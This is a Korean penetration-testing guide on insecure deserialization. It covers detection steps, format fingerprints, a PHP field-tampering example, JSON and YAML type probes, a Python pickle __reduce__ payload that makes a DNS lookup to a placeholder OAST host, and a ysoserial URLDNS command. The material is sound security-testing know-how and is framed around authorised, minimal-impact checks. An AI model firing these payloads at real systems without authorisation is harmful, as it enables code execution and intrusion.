---
sidebar_position: 30
title: 안전하지 않은 역직렬화
description: 직렬화 데이터 변조부터 임의 타입 생성과 gadget chain까지 확인하는 실무 역직렬화 진단 절차
keywords: [Insecure Deserialization, Object Injection, Java Serialization, PHP unserialize, Python pickle, BinaryFormatter, YAML, Gadget Chain, ysoserial, phpggc]
draft: false
toc_max_heading_level: 3
---

## 점검 목적

클라이언트가 바꿀 수 있는 직렬화 데이터를 서버가 객체로 복원하는지 확인한다. 복원된 객체의 값이나 자료형을 신뢰하면 권한·가격·기능 상태가 바뀔 수 있고, 임의 클래스까지 생성할 수 있으면 앱에 포함된 메서드가 실행될 수 있다.

직렬화 형식이 보인다는 사실만으로 취약하거나 원격 코드 실행이 가능한 것은 아니다. 데이터가 실제로 역직렬화되는지, 무결성 검증이 역직렬화 **전에** 수행되는지, 조작한 객체가 보안 동작에 영향을 주는지를 순서대로 확인한다.

## 유형 구분

| 유형 | 특징 | 실무 판단 |
| :--- | :--- | :--- |
| 객체 값 변조 | 직렬화된 권한·가격·상태 값이 그대로 복원됨 | 통제된 필드 하나의 변화가 서버 동작에 반영되는지 확인 |
| 자료형 변조 | 문자열을 정수·배열·객체 등 다른 자료형으로 바꿈 | 검증 또는 비교 로직이 달라지는지 확인 |
| 임의 타입 생성 | 입력 데이터가 생성할 클래스 이름까지 지정함 | 존재하지 않는 타입과 허용된 타입의 처리 차이를 비교 |
| 자동 메서드 실행 | 복원 과정에서 `readObject`, `__wakeup`, `__reduce__` 등이 호출됨 | 메서드 호출 자체와 실제 보안 영향을 구분 |
| Gadget chain | 앱에 이미 있는 여러 메서드가 연쇄 호출되어 파일·네트워크·명령 기능에 도달함 | 라이브러리와 버전이 맞는 경우에만 제한적으로 확인 |
| 객체 태그 로딩 | YAML·XML·JSON 태그가 일반 데이터가 아니라 객체 생성 지시로 처리됨 | 안전한 로더인지, 허용 타입이 제한되는지 확인 |

## 진단 절차

#### Step 1. 입력 지점과 정상 동작 기록

- 쿠키, hidden field, 요청 본문, 업로드 파일, 메시지 큐 입력, 캐시·세션 값을 확인한다.
- 정상 요청을 저장하고 해당 값이 로그아웃, 화면 설정, 장바구니, 가져오기 기능 중 어디에 사용되는지 기록한다.
- Base64, URL 인코딩, 압축, 암호화가 여러 겹이면 바깥쪽부터 한 단계씩 풀고 원본을 보존한다.

#### Step 2. 형식과 서버 기술 추정

| 관찰 값 | 가능한 형식 | 확인할 단서 |
| :--- | :--- | :--- |
| `rO0AB...` 또는 `AC ED 00 05` | Java native serialization | `ObjectInputStream`, `readObject` 오류 |
| `O:`, `a:`, `s:`와 길이 숫자 | PHP `serialize()` | `unserialize`, 클래스명, `__PHP_Incomplete_Class` |
| `gASV...` 또는 `80 04`, `80 05` | Python pickle의 흔한 형태 | `pickle.UnpicklingError`, protocol 번호 |
| `AAEAAAD/////` | .NET `BinaryFormatter` 계열 가능성 | `BinaryFormatter`, `SerializationException` |
| `$type`, `@type`, `@class` | JSON 다형성 타입 정보 가능성 | Json.NET, Jackson, fastjson 오류 |
| `!!python/object`, `!ruby/object` | YAML 객체 태그 | PyYAML, Psych, loader 오류 |

접두어는 단서일 뿐이다. 같은 Base64 접두어가 없다고 역직렬화를 배제하지 말고, `__VIEWSTATE`가 있다는 이유만으로 `BinaryFormatter` 취약점이라고 판단하지 않는다.

#### Step 3. 최소 변조로 실제 복원 여부 확인

- 구조를 유지한 채 테스트용 문자열, 불리언, 숫자 중 한 값만 바꾼다.
- PHP처럼 문자열 길이가 형식에 포함되면 길이도 함께 맞춘다.
- 안전한 필드가 없다면 한 바이트만 바꾼 요청을 한 번 보내 역직렬화 오류가 생기는지 확인한다.
- 동일 요청을 다시 보내 결과가 반복되는지 확인한다.

#### Step 4. 무결성 검증 위치 확인

- 값을 바꾸자마자 `invalid signature`, `MAC validation failed`로 거절되면 서명 또는 MAC이 있을 수 있다.
- 검증 실패가 역직렬화 오류보다 먼저 발생하는지 확인한다. 객체를 만든 뒤 검증하는 방식은 보호가 늦다.
- 단순 Base64, URL 인코딩, 암호화만으로는 데이터 변조 방지 기능이 되지 않는다.

#### Step 5. 보안 영향과 임의 타입 제어 구분

- 먼저 테스트 계정의 화면 설정이나 통제된 기능 상태처럼 되돌릴 수 있는 값을 확인한다.
- 권한, 사용자 ID, 가격 같은 필드는 승인된 테스트 데이터에서만 최소 범위로 검증한다.
- 타입 메타데이터가 있으면 존재하지 않는 타입을 보내 타입 해석 여부부터 확인한다.
- 라이브러리와 버전이 확인되기 전에는 무작위 gadget chain을 대량으로 보내지 않는다.

#### Step 6. 조건부 영향 확인

- 임의 타입 생성이나 자동 메서드 호출이 확인된 경우에만 해당 기술의 gadget을 조사한다.
- 명령 실행보다 DNS-only 콜백처럼 짧고 결과가 명확한 증거를 우선한다.
- 콜백이 없으면 네트워크 차단, 라이브러리 불일치, 역직렬화 전 무결성 검증을 구분한다.

### 상황별 빠른 선택

| 현재 상황 | 첫 확인 |
| :--- | :--- |
| 사람이 읽을 수 있는 PHP 객체 | 길이를 유지하며 테스트 필드 하나 변경 |
| Base64 쿠키 | 디코딩 후 매직 바이트와 서명 구간 확인 |
| JSON에 `$type`·`@type`이 있음 | 존재하지 않는 타입으로 타입 해석 오류 비교 |
| YAML 업로드·가져오기 | 일반 맵과 객체 태그 처리 차이 확인 |
| `__VIEWSTATE`가 있음 | MAC 검증 여부와 페이지 설정부터 확인 |
| 역직렬화 클래스가 오류에 노출됨 | 라이브러리·버전 확인 후 맞는 도구 선택 |

## 페이로드 노트

### 1. 인코딩을 풀어 형식 확인

**이럴 때 사용**: 쿠키나 hidden field가 의미 없는 긴 문자열로 보일 때 사용한다.

```bash
printf '%s' '<VALUE>' | base64 -d | xxd
```

**확인할 것**: 매직 바이트, 사람이 읽을 수 있는 클래스명, 필드명, 압축 헤더를 확인한다. 디코딩에 성공했다는 사실은 역직렬화 취약점의 증거가 아니다.

### 2. PHP 객체의 안전한 필드 변경

**이럴 때 사용**: PHP 직렬화 문자열이 클라이언트에 노출되고 테스트 계정의 화면 설정 같은 필드가 있을 때 사용한다.

```text
a:2:{s:5:"theme";s:4:"dark";s:8:"showHelp";b:0;}
```

```text
a:2:{s:5:"theme";s:4:"dark";s:8:"showHelp";b:1;}
```

**확인할 것**: 두 번째 값이 서버에서 복원되어 해당 설정만 바뀌는지 확인한다. 값 변조가 되더라도 보안과 무관한 설정만 바뀐다면 역직렬화 지점은 확인되지만 영향은 제한적이다.

### 3. 형식 오류로 처리 함수 확인

**이럴 때 사용**: 읽을 수 있는 필드가 없고 서버가 해당 값을 실제로 처리하는지 확인해야 할 때 사용한다.

| 형식 | 최소 변경 | 기대 단서 |
| :--- | :--- | :--- |
| Java | `AC ED 00 05` 뒤 데이터 한 바이트 변경 | `StreamCorruptedException`, `InvalidClassException` |
| PHP | 문자열 길이 숫자만 1만큼 다르게 변경 | `unserialize(): Error at offset` |
| Python | pickle protocol 뒤 opcode 한 바이트 변경 | `UnpicklingError`, invalid load key |
| .NET | Base64 디코딩 데이터 한 바이트 변경 | `SerializationException` |

오류는 역직렬화 경로의 후보 증거다. 정상 구조의 값 변경이나 타입 처리 차이까지 재현해야 취약 여부를 판단할 수 있다.

### 4. JSON 타입 메타데이터 확인

**이럴 때 사용**: 요청이나 응답에 `$type`, `@type`, `@class` 같은 클래스 정보가 보일 때 사용한다.

```json
{
  "$type": "Assessment.MissingType, MissingAssembly",
  "value": "test"
}
```

```json
{
  "@type": "assessment.missing.Type",
  "value": "test"
}
```

**확인할 것**: 서버가 키를 일반 데이터로 무시하는지, 허용 목록에서 거절하는지, 실제 타입을 찾으려다 오류가 나는지 비교한다. 타입 오류는 다형성 역직렬화의 단서지만 사용 가능한 위험 타입이 확인되기 전에는 코드 실행으로 판정하지 않는다.

### 5. YAML 객체 태그 처리 확인

**이럴 때 사용**: YAML 설정 가져오기나 변환 API가 있고 Python 또는 Ruby 객체 태그를 받을 가능성이 있을 때 사용한다.

```yaml
name: assessment
options:
  enabled: true
```

```yaml
name: !!python/object/new:builtins.str
  - assessment
```

안전한 로더는 일반적으로 객체 생성 태그를 거절한다. 두 번째 문서가 처리된다는 사실은 unsafe loader 사용 후보이며, 곧바로 명령 실행을 의미하지는 않는다.

### 6. Python pickle의 DNS-only 확인

**이럴 때 사용**: 서버가 클라이언트 제공 pickle을 실제로 `load` 또는 `loads`에 전달한다는 근거가 있고 OAST 사용이 허용된 경우에만 사용한다.

```python
import base64
import pickle
import socket

class DnsProbe:
    def __reduce__(self):
        return (socket.gethostbyname, ("<UNIQUE>.oast.example",))

payload = pickle.dumps(DnsProbe())
print(base64.b64encode(payload).decode())
```

고유 도메인의 DNS 조회가 도착하면 역직렬화 과정에서 지정한 Python callable이 실행된 것이다. 외부 DNS가 막힌 환경에서는 콜백 부재만으로 안전하다고 판단하지 않는다.

### 7. Java gadget은 DNS-only부터 확인

**이럴 때 사용**: Java native serialization이 확정되고, 대상이 입력을 역직렬화하며 OAST 사용이 허용된 경우 사용한다.

```bash
java -jar ysoserial-all.jar URLDNS \
  'http://<UNIQUE>.oast.example/' > payload.bin
```

`URLDNS`는 명령 실행 대신 Java의 URL 처리 과정에서 DNS 조회가 발생하는지 보는 용도다. 콜백은 역직렬화와 해당 gadget 동작을 보여주지만 운영체제 명령 실행까지 입증하지는 않는다. 이후 chain은 확인된 클래스패스와 라이브러리 버전에 맞춰 선택한다.

### 8. PHP와 .NET 도구는 환경 확인 뒤 사용

**이럴 때 사용**: 프레임워크·라이브러리·formatter가 오류나 구성 정보로 확인된 경우 사용한다.

```bash
# PHP: 설치된 chain과 필요한 버전·인자를 먼저 확인
phpggc -l

# .NET: formatter와 gadget 목록을 먼저 확인
ysoserial.exe --help
```

PHPGGC와 ysoserial.net의 chain은 대상에 해당 클래스가 있어야 동작한다. `__VIEWSTATE`는 그 자체로 취약점이 아니며, ViewState MAC이 유효하거나 서버의 `validationKey`를 모르면 변조가 차단될 수 있다. .NET 9부터 기본 제공 `BinaryFormatter` 구현은 실행 시 예외를 내지만, 기존 .NET Framework와 별도 호환 패키지 사용 환경은 계속 구분해서 확인한다.

### 9. 제한된 보안 영향 확인

**이럴 때 사용**: 역직렬화와 변조 가능성이 확인된 뒤 실제 취약점을 확정할 때 사용한다.

- 테스트 계정의 권한 불리언이 서버 권한 검사에 사용되는지 확인한다.
- 장바구니나 주문은 별도 테스트 상품의 한 필드만 바꾸고 서버 재계산 여부를 확인한다.
- 사용자 ID는 본인 소유 테스트 객체 두 개 사이에서만 바꿔 접근 경계를 확인한다.
- 자동 메서드 실행은 고유 DNS 콜백 1회처럼 짧고 중복되지 않는 증거를 사용한다.

## 우회 매트릭스

| 관찰 결과 | 다음 확인 | 판단 |
| :--- | :--- | :--- |
| 값을 바꾸면 즉시 MAC 오류 | 서명 범위와 검증 순서 확인 | 역직렬화 전 검증이면 직접 변조는 차단됨 |
| Base64를 다시 만들었지만 요청이 실패 | URL 인코딩, 압축, 길이 필드 순서 확인 | 재인코딩 오류일 수 있음 |
| 한 바이트 변경에만 500 발생 | 정상 구조의 안전한 값 변경 시도 | 오류만으로 취약 확정 불가 |
| 타입 키가 일반 문자열로 저장됨 | 응답과 서버 동작에서 타입 생성 흔적 확인 | 다형성 타입 처리가 아닐 수 있음 |
| 존재하지 않는 타입 오류가 발생 | 허용 목록과 실제 로드 가능한 타입 확인 | 임의 타입 생성 후보 |
| gadget 콜백이 없음 | 형식, 클래스패스, egress, 서명 검증을 각각 확인 | 안전하다는 뜻은 아님 |
| ViewState 변경이 거절됨 | MAC 설정과 서버 오류 확인 | `__VIEWSTATE` 존재만으로 취약 아님 |
| 프록시에서 응답이 동일함 | 후속 요청의 세션·캐시·서버 로그 확인 | 복원 결과가 다음 요청에서 쓰일 수 있음 |

## 취약 판정

### 확정

- 클라이언트가 바꾼 직렬화 객체의 권한·사용자·가격·상태 값이 서버의 보안 동작에 그대로 사용된다.
- 입력 데이터가 지정한 예상 밖 타입이 생성되고, 그 타입의 자동 메서드가 실행된다.
- 허가된 DNS-only 또는 최소 명령 검증에서 gadget chain 실행 증거가 확인된다.
- 안전하지 않은 YAML·pickle 로더가 외부 입력의 callable 또는 객체 생성 지시를 실행한다.

### 후보 또는 보류

- 직렬화 접두어 또는 클래스명만 보인다.
- 깨진 데이터에서 역직렬화 관련 오류만 발생한다.
- 값은 복원되지만 화면 설정처럼 보안 영향이 없는 필드만 변경된다.
- 타입 해석 오류는 나지만 허용 타입 우회나 자동 메서드 실행은 확인되지 않는다.
- 서명 검증, 네트워크 차단, 라이브러리 불일치 때문에 영향 검증이 재현되지 않는다.

### 영향 상승

- 다른 사용자의 권한이나 객체 식별자를 조작할 수 있다.
- 서버 파일, 내부 네트워크 또는 외부 통신 기능에 도달한다.
- 서버 프로세스 권한으로 짧은 명령 실행이 재현된다.
- 동일한 역직렬화 경로가 인증 전 요청이나 여러 서비스에서 사용된다.

## 참고자료

### 공식 및 테스트 가이드

- [OWASP Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)
- [PortSwigger Web Security Academy - Insecure deserialization](https://portswigger.net/web-security/deserialization)
- [CWE-502 - Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)
- [Java JEP 290 - Filter Incoming Serialization Data](https://openjdk.org/jeps/290)
- [Python - `pickle` documentation](https://docs.python.org/3/library/pickle.html)
- [PHP - `unserialize()`](https://www.php.net/manual/en/function.unserialize.php)
- [Microsoft - BinaryFormatter security guide](https://learn.microsoft.com/en-us/dotnet/standard/serialization/binaryformatter-security-guide)

### 커뮤니티 참고 / 도구

- [ysoserial](https://github.com/frohoff/ysoserial)
- [PHPGGC](https://github.com/ambionics/phpggc)
- [ysoserial.net](https://github.com/pwntester/ysoserial.net)
- [HackTricks - Deserialization](https://book.hacktricks.wiki/en/pentesting-web/deserialization/index.html)
